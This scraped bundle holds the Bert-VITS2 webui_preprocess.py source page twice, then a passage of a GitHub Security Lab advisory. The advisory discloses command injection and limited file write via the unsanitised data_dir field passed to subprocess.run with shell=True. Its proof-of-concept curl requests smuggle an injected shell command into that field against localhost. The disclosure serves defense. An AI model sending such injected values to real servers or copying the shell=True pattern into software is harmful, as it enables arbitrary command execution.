=== Content from github.com_52ffccbb_20250111_143108.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffishaudio%2FBert-VITS2%2Fblob%2F76653b5b6d657143721df2ed6c5c246b4b1d9277%2Fwebui_preprocess.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffishaudio%2FBert-VITS2%2Fblob%2F76653b5b6d657143721df2ed6c5c246b4b1d9277%2Fwebui_preprocess.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=fishaudio%2FBert-VITS2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fishaudio](/fishaudio)
/
**[Bert-VITS2](/fishaudio/Bert-VITS2)**
Public

* [Notifications](/login?return_to=%2Ffishaudio%2FBert-VITS2) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Ffishaudio%2FBert-VITS2)
* [Star
   8.2k](/login?return_to=%2Ffishaudio%2FBert-VITS2)

* [Code](/fishaudio/Bert-VITS2)
* [Pull requests
  0](/fishaudio/Bert-VITS2/pulls)
* [Discussions](/fishaudio/Bert-VITS2/discussions)
* [Actions](/fishaudio/Bert-VITS2/actions)
* [Security](/fishaudio/Bert-VITS2/security)
* [Insights](/fishaudio/Bert-VITS2/pulse)

Additional navigation options

* [Code](/fishaudio/Bert-VITS2)
* [Pull requests](/fishaudio/Bert-VITS2/pulls)
* [Discussions](/fishaudio/Bert-VITS2/discussions)
* [Actions](/fishaudio/Bert-VITS2/actions)
* [Security](/fishaudio/Bert-VITS2/security)
* [Insights](/fishaudio/Bert-VITS2/pulse)

## Files

 76653b5
## Breadcrumbs

1. [Bert-VITS2](/fishaudio/Bert-VITS2/tree/76653b5b6d657143721df2ed6c5c246b4b1d9277)
/
# webui\_preprocess.py

Copy path Blame  Blame
## Latest commit

## History

[History](/fishaudio/Bert-VITS2/commits/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py)166 lines (152 loc) · 7.62 KB 76653b5
## Breadcrumbs

1. [Bert-VITS2](/fishaudio/Bert-VITS2/tree/76653b5b6d657143721df2ed6c5c246b4b1d9277)
/
# webui\_preprocess.py

Top
## File metadata and controls

* Code
* Blame

166 lines (152 loc) · 7.62 KB[Raw](https://github.com/fishaudio/Bert-VITS2/raw/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166import gradio as grimport webbrowserimport osimport jsonimport subprocessimport shutil
def get\_path(data\_dir): start\_path = os.path.join("./data", data\_dir) lbl\_path = os.path.join(start\_path, "esd.list") train\_path = os.path.join(start\_path, "train.list") val\_path = os.path.join(start\_path, "val.list") config\_path = os.path.join(start\_path, "configs", "config.json") return start\_path, lbl\_path, train\_path, val\_path, config\_path
def generate\_config(data\_dir, batch\_size): assert data\_dir != "", "数据集名称不能为空" start\_path, \_, train\_path, val\_path, config\_path = get\_path(data\_dir) if os.path.isfile(config\_path): config = json.load(open(config\_path, "r", encoding="utf-8")) else: config = json.load(open("configs/config.json", "r", encoding="utf-8")) config["data"]["training\_files"] = train\_path config["data"]["validation\_files"] = val\_path config["train"]["batch\_size"] = batch\_size out\_path = os.path.join(start\_path, "configs") if not os.path.isdir(out\_path): os.mkdir(out\_path) model\_path = os.path.join(start\_path, "models") if not os.path.isdir(model\_path): os.mkdir(model\_path) with open(config\_path, "w", encoding="utf-8") as f: json.dump(config, f, indent=4) if not os.path.exists("config.yml"): shutil.copy(src="default\_config.yml", dst="config.yml") return "配置文件生成完成"
def resample(data\_dir): assert data\_dir != "", "数据集名称不能为空" start\_path, \_, \_, \_, config\_path = get\_path(data\_dir) in\_dir = os.path.join(start\_path, "raw") out\_dir = os.path.join(start\_path, "wavs") subprocess.run( f"python resample\_legacy.py " f"--sr 44100 " f"--in\_dir {in\_dir} " f"--out\_dir {out\_dir} ", shell=True, ) return "音频文件预处理完成"
def preprocess\_text(data\_dir): assert data\_dir != "", "数据集名称不能为空" start\_path, lbl\_path, train\_path, val\_path, config\_path = get\_path(data\_dir) lines = open(lbl\_path, "r", encoding="utf-8").readlines() with open(lbl\_path, "w", encoding="utf-8") as f: for line in lines: path, spk, language, text = line.strip().split("|") path = os.path.join(start\_path, "wavs", os.path.basename(path)).replace( "\\", "/" ) f.writelines(f"{path}|{spk}|{language}|{text}\n") subprocess.run( f"python preprocess\_text.py " f"--transcription-path {lbl\_path} " f"--train-path {train\_path} " f"--val-path {val\_path} " f"--config-path {config\_path}", shell=True, ) return "标签文件预处理完成"
def bert\_gen(data\_dir): assert data\_dir != "", "数据集名称不能为空" \_, \_, \_, \_, config\_path = get\_path(data\_dir) subprocess.run( f"python bert\_gen.py " f"--config {config\_path}", shell=True, ) return "BERT 特征文件生成完成"
if \_\_name\_\_ == "\_\_main\_\_": with gr.Blocks() as app: with gr.Row(): with gr.Column(): \_ = gr.Markdown( value="# Bert-VITS2 数据预处理\n" "## 预先准备：\n" "下载 BERT 和 CLAP 模型：\n" "- [中文 RoBERTa](https://huggingface.co/hfl/chinese-roberta-wwm-ext-large)\n" "- [日文 DeBERTa](https://huggingface.co/ku-nlp/deberta-v2-large-japanese-char-wwm)\n" "- [英文 DeBERTa](https://huggingface.co/microsoft/deberta-v3-large)\n" "- [WavLM](https://huggingface.co/microsoft/wavlm-base-plus)\n" "\n" "将 BERT 模型放置到 `bert` 文件夹下，WavLM 模型放置到 `slm` 文件夹下，覆盖同名文件夹。\n" "\n" "数据准备：\n" "将数据放置在 data 文件夹下，按照如下结构组织：\n" "\n" "```\n" "├── data\n" "│ ├── {你的数据集名称}\n" "│ │ ├── esd.list\n" "│ │ ├── raw\n" "│ │ │ ├── \*\*\*\*.wav\n" "│ │ │ ├── \*\*\*\*.wav\n" "│ │ │ ├── ...\n" "```\n" "\n" "其中，`raw` 文件夹下保存所有的音频文件，`esd.list` 文件为标签文本，格式为\n" "\n" "```\n" "\*\*\*\*.wav|{说话人名}|{语言 ID}|{标签文本}\n" "```\n" "\n" "例如：\n" "```\n" "vo\_ABDLQ001\_1\_paimon\_02.wav|派蒙|ZH|没什么没什么，只是平时他总是站在这里，有点奇怪而已。\n" "noa\_501\_0001.wav|NOA|JP|そうだね、油断しないのはとても大事なことだと思う\n" "Albedo\_vo\_ABDLQ002\_4\_albedo\_01.wav|Albedo|EN|Who are you? Why did you alarm them?\n" "...\n" "```\n" ) data\_dir = gr.Textbox( label="数据集名称", placeholder="你放置在 data 文件夹下的数据集所在文件夹的名称，如 data/genshin 则填 genshin", ) info = gr.Textbox(label="状态信息") \_ = gr.Markdown(value="## 第一步：生成配置文件") with gr.Row(): batch\_size = gr.Slider( label="批大小（Batch size）：24 GB 显存可用 12", value=8, minimum=1, maximum=64, step=1, ) generate\_config\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown(value="## 第二步：预处理音频文件") resample\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown(value="## 第三步：预处理标签文件") preprocess\_text\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown(value="## 第四步：生成 BERT 特征文件") bert\_gen\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown( value="## 训练模型及部署：\n" "修改根目录下的 `config.yml` 中 `dataset\_path` 一项为 `data/{你的数据集名称}`\n" "- 训练：将[预训练模型文件](https://openi.pcl.ac.cn/Stardust\_minus/Bert-VITS2/modelmanage/show\_model)（`D\_0.pth`、`DUR\_0.pth`、`WD\_0.pth` 和 `G\_0.pth`）放到 `data/{你的数据集名称}/models` 文件夹下，执行 `torchrun --nproc\_per\_node=1 train\_ms.py` 命令（多卡运行可参考 `run\_MnodesAndMgpus.sh` 中的命令。\n" "- 部署：修改根目录下的 `config.yml` 中 `webui` 下 `model` 一项为 `models/{权重文件名}.pth` （如 G\_10000.pth），然后执行 `python webui.py`" )
 generate\_config\_btn.click( generate\_config, inputs=[data\_dir, batch\_size], outputs=[info] ) resample\_btn.click(resample, inputs=[data\_dir], outputs=[info]) preprocess\_text\_btn.click(preprocess\_text, inputs=[data\_dir], outputs=[info]) bert\_gen\_btn.click(bert\_gen, inputs=[data\_dir], outputs=[info])
 webbrowser.open("http://127.0.0.1:7860") app.launch(share=False, server\_port=7860)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_867c1c4c_20250111_143109.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffishaudio%2FBert-VITS2%2Fblob%2F76653b5b6d657143721df2ed6c5c246b4b1d9277%2Fwebui_preprocess.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ffishaudio%2FBert-VITS2%2Fblob%2F76653b5b6d657143721df2ed6c5c246b4b1d9277%2Fwebui_preprocess.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=fishaudio%2FBert-VITS2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[fishaudio](/fishaudio)
/
**[Bert-VITS2](/fishaudio/Bert-VITS2)**
Public

* [Notifications](/login?return_to=%2Ffishaudio%2FBert-VITS2) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Ffishaudio%2FBert-VITS2)
* [Star
   8.2k](/login?return_to=%2Ffishaudio%2FBert-VITS2)

* [Code](/fishaudio/Bert-VITS2)
* [Pull requests
  0](/fishaudio/Bert-VITS2/pulls)
* [Discussions](/fishaudio/Bert-VITS2/discussions)
* [Actions](/fishaudio/Bert-VITS2/actions)
* [Security](/fishaudio/Bert-VITS2/security)
* [Insights](/fishaudio/Bert-VITS2/pulse)

Additional navigation options

* [Code](/fishaudio/Bert-VITS2)
* [Pull requests](/fishaudio/Bert-VITS2/pulls)
* [Discussions](/fishaudio/Bert-VITS2/discussions)
* [Actions](/fishaudio/Bert-VITS2/actions)
* [Security](/fishaudio/Bert-VITS2/security)
* [Insights](/fishaudio/Bert-VITS2/pulse)

## Files

 76653b5
## Breadcrumbs

1. [Bert-VITS2](/fishaudio/Bert-VITS2/tree/76653b5b6d657143721df2ed6c5c246b4b1d9277)
/
# webui\_preprocess.py

Copy path Blame  Blame
## Latest commit

## History

[History](/fishaudio/Bert-VITS2/commits/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py)166 lines (152 loc) · 7.62 KB 76653b5
## Breadcrumbs

1. [Bert-VITS2](/fishaudio/Bert-VITS2/tree/76653b5b6d657143721df2ed6c5c246b4b1d9277)
/
# webui\_preprocess.py

Top
## File metadata and controls

* Code
* Blame

166 lines (152 loc) · 7.62 KB[Raw](https://github.com/fishaudio/Bert-VITS2/raw/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166import gradio as grimport webbrowserimport osimport jsonimport subprocessimport shutil
def get\_path(data\_dir): start\_path = os.path.join("./data", data\_dir) lbl\_path = os.path.join(start\_path, "esd.list") train\_path = os.path.join(start\_path, "train.list") val\_path = os.path.join(start\_path, "val.list") config\_path = os.path.join(start\_path, "configs", "config.json") return start\_path, lbl\_path, train\_path, val\_path, config\_path
def generate\_config(data\_dir, batch\_size): assert data\_dir != "", "数据集名称不能为空" start\_path, \_, train\_path, val\_path, config\_path = get\_path(data\_dir) if os.path.isfile(config\_path): config = json.load(open(config\_path, "r", encoding="utf-8")) else: config = json.load(open("configs/config.json", "r", encoding="utf-8")) config["data"]["training\_files"] = train\_path config["data"]["validation\_files"] = val\_path config["train"]["batch\_size"] = batch\_size out\_path = os.path.join(start\_path, "configs") if not os.path.isdir(out\_path): os.mkdir(out\_path) model\_path = os.path.join(start\_path, "models") if not os.path.isdir(model\_path): os.mkdir(model\_path) with open(config\_path, "w", encoding="utf-8") as f: json.dump(config, f, indent=4) if not os.path.exists("config.yml"): shutil.copy(src="default\_config.yml", dst="config.yml") return "配置文件生成完成"
def resample(data\_dir): assert data\_dir != "", "数据集名称不能为空" start\_path, \_, \_, \_, config\_path = get\_path(data\_dir) in\_dir = os.path.join(start\_path, "raw") out\_dir = os.path.join(start\_path, "wavs") subprocess.run( f"python resample\_legacy.py " f"--sr 44100 " f"--in\_dir {in\_dir} " f"--out\_dir {out\_dir} ", shell=True, ) return "音频文件预处理完成"
def preprocess\_text(data\_dir): assert data\_dir != "", "数据集名称不能为空" start\_path, lbl\_path, train\_path, val\_path, config\_path = get\_path(data\_dir) lines = open(lbl\_path, "r", encoding="utf-8").readlines() with open(lbl\_path, "w", encoding="utf-8") as f: for line in lines: path, spk, language, text = line.strip().split("|") path = os.path.join(start\_path, "wavs", os.path.basename(path)).replace( "\\", "/" ) f.writelines(f"{path}|{spk}|{language}|{text}\n") subprocess.run( f"python preprocess\_text.py " f"--transcription-path {lbl\_path} " f"--train-path {train\_path} " f"--val-path {val\_path} " f"--config-path {config\_path}", shell=True, ) return "标签文件预处理完成"
def bert\_gen(data\_dir): assert data\_dir != "", "数据集名称不能为空" \_, \_, \_, \_, config\_path = get\_path(data\_dir) subprocess.run( f"python bert\_gen.py " f"--config {config\_path}", shell=True, ) return "BERT 特征文件生成完成"
if \_\_name\_\_ == "\_\_main\_\_": with gr.Blocks() as app: with gr.Row(): with gr.Column(): \_ = gr.Markdown( value="# Bert-VITS2 数据预处理\n" "## 预先准备：\n" "下载 BERT 和 CLAP 模型：\n" "- [中文 RoBERTa](https://huggingface.co/hfl/chinese-roberta-wwm-ext-large)\n" "- [日文 DeBERTa](https://huggingface.co/ku-nlp/deberta-v2-large-japanese-char-wwm)\n" "- [英文 DeBERTa](https://huggingface.co/microsoft/deberta-v3-large)\n" "- [WavLM](https://huggingface.co/microsoft/wavlm-base-plus)\n" "\n" "将 BERT 模型放置到 `bert` 文件夹下，WavLM 模型放置到 `slm` 文件夹下，覆盖同名文件夹。\n" "\n" "数据准备：\n" "将数据放置在 data 文件夹下，按照如下结构组织：\n" "\n" "```\n" "├── data\n" "│ ├── {你的数据集名称}\n" "│ │ ├── esd.list\n" "│ │ ├── raw\n" "│ │ │ ├── \*\*\*\*.wav\n" "│ │ │ ├── \*\*\*\*.wav\n" "│ │ │ ├── ...\n" "```\n" "\n" "其中，`raw` 文件夹下保存所有的音频文件，`esd.list` 文件为标签文本，格式为\n" "\n" "```\n" "\*\*\*\*.wav|{说话人名}|{语言 ID}|{标签文本}\n" "```\n" "\n" "例如：\n" "```\n" "vo\_ABDLQ001\_1\_paimon\_02.wav|派蒙|ZH|没什么没什么，只是平时他总是站在这里，有点奇怪而已。\n" "noa\_501\_0001.wav|NOA|JP|そうだね、油断しないのはとても大事なことだと思う\n" "Albedo\_vo\_ABDLQ002\_4\_albedo\_01.wav|Albedo|EN|Who are you? Why did you alarm them?\n" "...\n" "```\n" ) data\_dir = gr.Textbox( label="数据集名称", placeholder="你放置在 data 文件夹下的数据集所在文件夹的名称，如 data/genshin 则填 genshin", ) info = gr.Textbox(label="状态信息") \_ = gr.Markdown(value="## 第一步：生成配置文件") with gr.Row(): batch\_size = gr.Slider( label="批大小（Batch size）：24 GB 显存可用 12", value=8, minimum=1, maximum=64, step=1, ) generate\_config\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown(value="## 第二步：预处理音频文件") resample\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown(value="## 第三步：预处理标签文件") preprocess\_text\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown(value="## 第四步：生成 BERT 特征文件") bert\_gen\_btn = gr.Button(value="执行", variant="primary") \_ = gr.Markdown( value="## 训练模型及部署：\n" "修改根目录下的 `config.yml` 中 `dataset\_path` 一项为 `data/{你的数据集名称}`\n" "- 训练：将[预训练模型文件](https://openi.pcl.ac.cn/Stardust\_minus/Bert-VITS2/modelmanage/show\_model)（`D\_0.pth`、`DUR\_0.pth`、`WD\_0.pth` 和 `G\_0.pth`）放到 `data/{你的数据集名称}/models` 文件夹下，执行 `torchrun --nproc\_per\_node=1 train\_ms.py` 命令（多卡运行可参考 `run\_MnodesAndMgpus.sh` 中的命令。\n" "- 部署：修改根目录下的 `config.yml` 中 `webui` 下 `model` 一项为 `models/{权重文件名}.pth` （如 G\_10000.pth），然后执行 `python webui.py`" )
 generate\_config\_btn.click( generate\_config, inputs=[data\_dir, batch\_size], outputs=[info] ) resample\_btn.click(resample, inputs=[data\_dir], outputs=[info]) preprocess\_text\_btn.click(preprocess\_text, inputs=[data\_dir], outputs=[info]) bert\_gen\_btn.click(bert\_gen, inputs=[data\_dir], outputs=[info])
 webbrowser.open("http://127.0.0.1:7860") app.launch(share=False, server\_port=7860)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_c2e6cc05_20250111_143109.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 17, 2024
# GHSL-2024-045\_GHSL-2024-047: Command Injection and Limited File Write in fishaudio/Bert-VITS2 - CVE-2024-39685, CVE-2024-39686, CVE-2024-39688

[![Author avatar](https://avatars.githubusercontent.com/u/102833689)
Sylwia Budzynska](https://github.com/sylwia-budzynska)

## Coordinated Disclosure Timeline

* 2024-03-22: Sent an email to the maintainer’s email.
* 2024-04-22: Sent an email asking for an update.
* 2024-06-13: Created a [discussion](https://github.com/fishaudio/Bert-VITS2/discussions/377) asking for a contact person.
* 2024-06-24: Pinged two maintainers on the discussion post.
* 2024-07-05: Disclosing as per our [disclosure policy](https://securitylab.github.com/advisories/#policy).

## Summary

fishaudio/Bert-VITS2 [v2.3](https://github.com/fishaudio/Bert-VITS2/releases/tag/v2.3) is vulnerable to command injections and limited file write vulnerabilties.

## Project

fishaudio/Bert-VITS2

## Tested Version

[v2.3](https://github.com/fishaudio/Bert-VITS2/releases/tag/v2.3)

## Details

### Issue 1: Command injection in `webui_preprocess.py` `resample` function (`GHSL-2024-045`)

User input supplied to the [`data_dir`](https://github.com/fishaudio/Bert-VITS2/blob/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py#L130-L133) variable is used directly in a command executed with `subprocess.run(cmd, shell=True)` on [lines 46-52](https://github.com/fishaudio/Bert-VITS2/blob/3f8c537f4aeb281df3fb3c455eed9a1b64871a81/webui_preprocess.py#L46-L52) in the `resample` function, which leads to arbitrary command execution.

```
def resample(data_dir):
    assert data_dir != "", "数据集名称不能为空"
    start_path, _, _, _, config_path = get_path(data_dir)
    in_dir = os.path.join(start_path, "raw")
    out_dir = os.path.join(start_path, "wavs")
    subprocess.run(
        f"python resample_legacy.py "
        f"--sr 44100 "
        f"--in_dir {in_dir} "
        f"--out_dir {out_dir} ",
        shell=True,
    )
    return "音频文件预处理完成"

```
#### Impact

This issue may lead to arbitrary command execution on the server running Bert-VITS2.

#### Proof of Concept

1. Run `webui_preprocess.py`. We assume here it is running on `localhost:7860`
2. Send the following request:
   ```
   curl -i -s -k -X $'POST' \
    -H $'Host: localhost:7860' -H $'Content-Length: 108' -H $'Content-Type: application/json' -H $'Accept: */*' -H $'Origin: http://localhost:7860' \
    --data-binary $'{\"data\":[\"test | echo \\\"foobar\\\" > file.txt #\"],\"event_data\":null,\"fn_index\":1,\"session_hash\":\"mgkr0gp8c4o\"}' \
    $'http://localhost:7860/run/predict'

   ```
3. Observe, as visible in the payload in the previous step, that a `file.txt` has been created with the contents `foobar`.

### Issue 2: Command injection in `webui_preprocess.py` `bert_gen` function (`GHSL-2024-046`)

User input supplied to the [`data_dir`](https://github.com/fishaudio/Bert-VITS2/blob/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py#L130-L133) variable is used directly in a command executed with `subprocess.run(cmd, shell=True)` on [line 82](https://github.com/fishaudio/Bert-VITS2/blob/3f8c537f4aeb281df3fb3c455eed9a1b64871a81/webui_preprocess.py#L82C9-L82C57) in the `bert_gen` function, which leads to arbitrary command execution.

```
def bert_gen(data_dir):
    assert data_dir != "", "数据集名称不能为空"
    _, _, _, _, config_path = get_path(data_dir)
    subprocess.run(
        f"python bert_gen.py " f"--config {config_path}",
        shell=True,
    )
    return "BERT 特征文件生成完成"

```
#### Impact

This issue may lead to arbitrary command execution on the server running Bert-VITS2.

#### Proof of Concept

1. Run `webui_preprocess.py`. We assume here it is running on `localhost:7860`
2. Send the following request:
   ```
   curl -i -s -k -X $'POST' \
    -H $'Host: localhost:7860' -H $'Content-Length: 111' -H $'Content-Type: application/json' -H $'Connection: close' \
    --data-binary $'{\"data\":[\"/tmp | echo \\\"foobar\\\" > foobar.txt #\"],\"event_data\":null,\"fn_index\":3,\"session_hash\":\"06f0laej69fm\"}' \
    $'http://localhost:7860/run/predict'

   ```
3. Observe, as visible in the payload in the previous step, that a `foobar.txt` has been created with the contents `foobar`.

### Issue 3: Limited file write in `webui_preprocess.py` `generate_config` function (`GHSL-2024-047`)

User input supplied to the [`data_dir`](https://github.com/fishaudio/Bert-VITS2/blob/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py#L130-L133) variable is concatenated with other folders and used to open a new file in the `generate_config` function on [line 34](https://github.com/fishaudio/Bert-VITS2/blob/76653b5b6d657143721df2ed6c5c246b4b1d9277/webui_preprocess.py#L34), which leads to a limited file write.

```
def generate_config(data_dir, batch_size):
    assert data_dir != "", "数据集名称不能为空"
    start_path, _, train_path, val_path, config_path = get_path(data_dir)
    if os.path.isfile(config_path):
        config = json.load(open(config_path, "r", encoding="utf-8"))
    else:
        config = json.load(open("configs/config.json", "r", encoding="utf-8"))
    config["data"]["training_files"] = train_path
    config["data"]["validation_files"] = val_path
    config["train"]["batch_size"] = batch_size
    out_path = os.path.join(start_path, "configs")
    if not os.path.isdir(out_path):
        os.mkdir(out_path)
    model_path = os.path.join(start_path, "models")
    if not os.path.isdir(model_path):
        os.mkdir(model_path)
    with open(config_path, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4)
    if not os.path.exists("config.yml"):
        shutil.copy(src="default_config.yml", dst="config.yml")
    return "配置文件生成完成"

```
#### Impact

